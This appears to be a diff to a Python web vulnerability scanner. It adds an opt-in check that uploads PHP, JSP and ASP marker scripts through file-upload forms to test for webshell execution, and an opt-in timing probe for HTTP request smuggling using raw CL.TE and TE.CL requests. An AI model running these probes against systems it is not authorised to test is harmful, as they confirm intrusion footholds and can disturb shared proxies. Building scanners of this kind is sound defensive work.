@@ -129,6 +129,47 @@ def _fetch_raw(ip: str, port: Port, path: str, auth: dict | None = None,
                 pass
 
 
+def _post_multipart(ip: str, port: Port, path: str, fields: dict, file_field: str,
+                    filename: str, content: bytes, ctype: str = "image/jpeg",
+                    auth: dict | None = None):
+    """POST one multipart/form-data upload. `fields` are extra text parts (hidden form
+    values). Returns (status, headers_lower, body_text) or None. Used only under the
+    opt-in --upload-shell proof."""
+    boundary = "----recce" + "".join(str((i * 7 + 3) % 10) for i in range(16))
+    parts = []
+    for k, v in (fields or {}).items():
+        parts.append(f'--{boundary}\r\nContent-Disposition: form-data; name="{k}"\r\n\r\n{v}\r\n'
+                     .encode("latin-1", "replace"))
+    parts.append((f'--{boundary}\r\nContent-Disposition: form-data; name="{file_field}"; '
+                  f'filename="{filename}"\r\nContent-Type: {ctype}\r\n\r\n').encode("latin-1"))
+    body = b"".join(parts) + content + f"\r\n--{boundary}--\r\n".encode()
+    use_tls = probes._is_tls(port)
+    conn = None
+    try:
+        if use_tls:
+            conn = http.client.HTTPSConnection(
+                ip, port.portid, timeout=proxy.scaled(_TIMEOUT),
+                context=ssl._create_unverified_context())
+        else:
+            conn = http.client.HTTPConnection(ip, port.portid, timeout=proxy.scaled(_TIMEOUT))
+        hdrs = {"User-Agent": _UA, "Connection": "close", "Accept": "*/*",
+                "Content-Type": f"multipart/form-data; boundary={boundary}"}
+        if auth:
+            hdrs.update({k: v for k, v in auth.items() if k.lower() != "content-type"})
+        conn.request("POST", path, body=body, headers=hdrs)
+        resp = conn.getresponse()
+        return resp.status, {k.lower(): v for k, v in resp.getheaders()}, \
+            resp.read(65536).decode("latin-1", "replace")
+    except (OSError, http.client.HTTPException, ssl.SSLError, ValueError):
+        return None
+    finally:
+        if conn is not None:
+            try:
+                conn.close()
+            except OSError:
+                pass
+
+
 # --- fingerprinting -------------------------------------------------------------
 
 _TITLE = re.compile(r"<title[^>]*>(.*?)</title>", re.I | re.S)
@@ -1587,6 +1628,190 @@ def _scan_cache_poison(ip: str, port: Port, auth) -> list[Vuln]:
     return out
 
 
+_UPLOAD_DIRS = ("uploads", "upload", "files", "file", "images", "img", "media",
+                "assets", "data", "tmp", "static")
+# ext -> (server-computed marker payload template, engine label). Each echoes a tag +
+# a COMPUTED value so a verbatim source echo can never false-positive as execution.
+_UPLOAD_ENGINES = [
+    ("php", "<?php echo '{tag}'.(7*7);?>", "PHP"),
+    ("phtml", "<?php echo '{tag}'.(7*7);?>", "PHP"),
+    ("php5", "<?php echo '{tag}'.(7*7);?>", "PHP"),
+    ("pht", "<?php echo '{tag}'.(7*7);?>", "PHP"),
+    ("jsp", "<% out.print(\"{tag}\"+(7*7)); %>", "JSP"),
+    ("asp", "<% Response.Write(\"{tag}\"&(7*7)) %>", "ASP"),
+]
+
+
+def _find_upload_forms(body: str, base_path: str) -> list[dict]:
+    """Multipart forms that carry a file input: {action, file_field, hidden{}}."""
+    out = []
+    for fm in _FORM_RE.findall(body or ""):
+        if "multipart/form-data" not in fm.lower():
+            continue
+        file_field = ""
+        hidden: dict = {}
+        for inp in _INPUT_RE.findall(fm):
+            nm = _NAME_RE.search(inp)
+            tm = _ITYPE_RE.search(inp)
+            name = nm.group(1) if nm else ""
+            itype = (tm.group(1).lower() if tm else "text")
+            if not name:
+                continue
+            if itype == "file" and not file_field:
+                file_field = name
+            elif itype == "hidden":
+                vm = re.search(r'value\s*=\s*["\']?([^"\'>\s]*)', inp, re.I)
+                hidden[name] = vm.group(1) if vm else ""
+        if file_field:
+            am = _ACTION_RE.search(fm)
+            out.append({"action": am.group(1) if am else base_path,
+                        "file_field": file_field, "hidden": hidden})
+    return out
+
+
+def _scan_upload(ip: str, port: Port, base: str, body: str, auth,
+                 prove: bool) -> list[Vuln]:
+    """File-upload attack surface. Always emits a low lead when a multipart upload form
+    is present. Under --upload-shell (`prove`) it uploads a benign server-computed-marker
+    payload and fetches it back: a computed marker in the response CONFIRMS code
+    execution (RCE); a verbatim-but-served copy is unrestricted storage. Leaves the
+    uploaded file's path in the finding for cleanup."""
+    forms = _find_upload_forms(body, "/")
+    if not forms:
+        return []
+    out: list[Vuln] = []
+    out.append(_mk(ip, port, "web-upload-form", "low",
+        "File-upload form present", ["CWE-434"],
+        f"A multipart/form-data upload form (file field '{forms[0]['file_field']}', action "
+        f"'{forms[0]['action']}') is exposed. Re-run `recce web --upload-shell` to actively "
+        "test whether a script can be uploaded and executed.",
+        "Validate type/extension server-side, store outside the web root, and serve via a "
+        "non-executing handler.", confidence="potential"))
+    if not prove:
+        return out
+    tag = "recceUP" + hashlib.sha1(f"{ip}:{port.portid}".encode()).hexdigest()[:8]
+    marker = tag + "49"                          # tag + (7*7), computed by the server
+    for form in forms[:2]:
+        action = urljoin(base + "/", form["action"])
+        act_path = urlparse(action).path or "/"
+        act_dir = act_path.rsplit("/", 1)[0]
+        for ext, tmpl, engine in _UPLOAD_ENGINES:
+            fn = f"{tag}.{ext}"
+            payload = tmpl.format(tag=tag).encode()
+            resp = _post_multipart(ip, port, act_path, form["hidden"], form["file_field"],
+                                   fn, payload, auth=auth)
+            if resp is None:
+                continue
+            # Candidate stored URLs: any path echoed in the response that names our file,
+            # plus the usual upload dirs and the form's own directory.
+            cands: list[str] = []
+            for m in re.finditer(re.escape(fn), resp[2]):
+                seg = resp[2][max(0, m.start() - 120):m.start() + len(fn)]
+                pm = re.search(r'(/[\w./\-]*%s)' % re.escape(fn), seg)
+                if pm:
+                    cands.append(pm.group(1))
+            for d in _UPLOAD_DIRS:
+                cands.append(f"/{d}/{fn}")
+            cands.append(f"{act_dir}/{fn}")
+            seen_c: set = set()
+            for c in cands:
+                if c in seen_c:
+                    continue
+                seen_c.add(c)
+                got = _fetch(ip, port, c, auth=auth)
+                if not got or got[0] != 200:
+                    continue
+                gb = got[2]
+                if marker in gb and "<?php" not in gb and tmpl.split("{tag}")[0] not in gb:
+                    out.append(_mk(ip, port, "web-upload-rce", "critical",
+                        f"Unrestricted file upload to {engine} code execution", ["CWE-434"],
+                        f"Uploaded {fn} via '{form['file_field']}' and GET {base}{c} returned the "
+                        f"SERVER-COMPUTED marker '{marker}' (payload echoed tag + 7*7) - the "
+                        f"{engine} was executed, not served as source. Remote code execution.",
+                        f"Delete {c}. Validate type server-side, store outside the web root, "
+                        "serve uploads via a non-executing path.", confidence="confirmed"))
+                    return out
+                if fn in gb or (tag in gb):        # stored + retrievable, not executed
+                    out.append(_mk(ip, port, "web-upload", "medium",
+                        "Unrestricted file upload (stored and retrievable)", ["CWE-434"],
+                        f"Uploaded {fn} and retrieved it at {base}{c} (HTTP 200) - the server "
+                        "stored an attacker-named file in a web-reachable path without "
+                        "executing it. With a matching handler (or a different extension) this "
+                        "is a webshell foothold.",
+                        f"Delete {c}. Enforce an allow-list of types, randomise stored names, "
+                        "and store outside the web root.", confidence="confirmed"))
+                    return out
+    return out
+
+
+def _raw_exchange(ip: str, port: Port, raw: bytes, timeout: float) -> float:
+    """Send raw bytes on a fresh socket and return seconds until the first response byte
+    (or `timeout` if none arrives). Used only by the opt-in smuggling probe."""
+    s = None
+    try:
+        s = socket.create_connection((ip, port.portid), timeout=timeout)
+        if probes._is_tls(port):
+            s = ssl._create_unverified_context().wrap_socket(s, server_hostname=ip)
+        s.sendall(raw)
+        s.settimeout(timeout)
+        t0 = time.monotonic()
+        try:
+            s.recv(1)
+        except (socket.timeout, TimeoutError):
+            return timeout
+        return time.monotonic() - t0
+    except OSError:
+        return -1.0
+    finally:
+        if s is not None:
+            try:
+                s.close()
+            except OSError:
+                pass
+
+
+def _scan_smuggle(ip: str, port: Port, timeout: float = 6.0) -> list[Vuln]:
+    """CL.TE / TE.CL request-smuggling detection by timing. A vulnerable front/back
+    disagreement makes one side wait for a chunk/body that never arrives, so the probe
+    stalls near the socket timeout while a well-formed control returns immediately. We
+    only send an incomplete body (never a smuggled second request), so nothing is
+    queued against another user. Opt-in (--smuggle) - can still disturb fragile proxies."""
+    host = f"{ip}:{port.portid}"
+    to = timeout
+    # Control: a well-formed keep-alive request must come back fast, or the host is just
+    # slow and any "delay" below would be a false positive.
+    ctrl = (f"GET / HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n").encode()
+    base_t = min(t for t in (_raw_exchange(ip, port, ctrl, to) for _ in range(2)))
+    if base_t < 0 or base_t > 2.0:
+        return []                                 # unreachable or slow: don't guess
+    probes_ = {
+        "CL.TE": (f"POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 4\r\n"
+                  f"Transfer-Encoding: chunked\r\n\r\n1\r\nA\r\nX").encode(),
+        "TE.CL": (f"POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 6\r\n"
+                  f"Transfer-Encoding: chunked\r\n\r\n0\r\n\r\nX").encode(),
+    }
+    out: list[Vuln] = []
+    for name, raw in probes_.items():
+        d1 = _raw_exchange(ip, port, raw, to)
+        if d1 < to - 1.0:
+            continue                              # no stall -> not this variant
+        d2 = _raw_exchange(ip, port, raw, to)     # confirm the stall reproduces
+        if d2 < to - 1.0:
+            continue
+        out.append(_mk(ip, port, "web-smuggle", "high",
+            f"HTTP request smuggling ({name} desync, timing)", ["CWE-444"],
+            f"A {name} probe (Content-Length + Transfer-Encoding disagreement) stalled the "
+            f"connection to ~{to:.0f}s on two tries while a well-formed request returned in "
+            f"{base_t:.2f}s - the front-end and back-end parse the body length differently "
+            "(classic desync signal). recce sent only an incomplete body, never a smuggled "
+            "second request.",
+            "Reject requests bearing both Content-Length and Transfer-Encoding; make the "
+            "front-end normalise/route on a single, consistent framing.",
+            confidence="potential"))
+        break                                     # one confirmed direction is enough
+    return out
+
+
 def _scan_reflection(ip: str, port: Port, base: str, auth) -> list[Vuln]:
     # One request. {{7*7}} / ${7*7} / <%=7*7%> evaluating to 49 near our canary is a
     # strong, low-false-positive SSTI signal; an unencoded <i> reflection is an
@@ -2512,10 +2737,13 @@ def _discover_vhosts(ip: str, port: Port, base: str, host_hint: str,
 
 def scan_endpoint(ip: str, port: Port, active: bool = True,
                   auth: dict | None = None, creds: bool = False,
-                  host_hint: str = "") -> tuple[dict, list[Vuln]]:
+                  host_hint: str = "", upload_shell: bool = False,
+                  smuggle: bool = False) -> tuple[dict, list[Vuln]]:
     """Deep, non-intrusive scan of one web endpoint. Returns (profile, [Vuln]).
     `auth` (Cookie/Authorization headers) runs the scan as an authenticated user;
-    `creds` opts into a tiny, lockout-aware default-credential probe."""
+    `creds` opts into a tiny, lockout-aware default-credential probe. `upload_shell`
+    and `smuggle` are explicit opt-ins for the two side-effecting active proofs
+    (benign webshell upload+fetch; CL.TE/TE.CL desync timing probe)."""
     findings: list[Vuln] = []
     base = url_for(ip, port)
     # Root fetch: fingerprint + directory listing + cookie flags.
@@ -2624,6 +2852,11 @@ def scan_endpoint(ip: str, port: Port, active: bool = True,
                     "Never allow-list the null origin; echo only trusted origins."))
     # Web cache poisoning: unkeyed header reflected into a cacheable response.
     findings.extend(_scan_cache_poison(ip, port, auth))
+    # File-upload surface (lead always; benign webshell proof only under --upload-shell).
+    findings.extend(_scan_upload(ip, port, base, body, auth, prove=upload_shell))
+    # HTTP request smuggling (CL.TE/TE.CL desync) - opt-in only; can disturb shared proxies.
+    if smuggle:
+        findings.extend(_scan_smuggle(ip, port))
     # GraphQL: introspection, plus query batching (brute-force/DoS amplifier) and
     # field-suggestion schema leak when introspection is off.
     gql = '{"query":"query{__schema{queryType{name}}}"}'
@@ -2723,7 +2956,8 @@ def scan_endpoint(ip: str, port: Port, active: bool = True,
 
 
 def scan_host(host: Host, active: bool = True, auth: dict | None = None,
-              creds: bool = False) -> list[dict]:
+              creds: bool = False, upload_shell: bool = False,
+              smuggle: bool = False) -> list[dict]:
     """Scan every web endpoint on a host, appending deduped Vulns. Returns the web
     endpoint profiles (for the Web sheet)."""
     existing = {v.key for v in host.vulns}
@@ -2732,7 +2966,8 @@ def scan_host(host: Host, active: bool = True, auth: dict | None = None,
         if not is_web(port):
             continue
         profile, findings = scan_endpoint(host.ip, port, active=active, auth=auth, creds=creds,
-                                          host_hint=host.hostname or "")
+                                          host_hint=host.hostname or "",
+                                          upload_shell=upload_shell, smuggle=smuggle)
         for v in findings:
             if v.key in existing:
                 continue
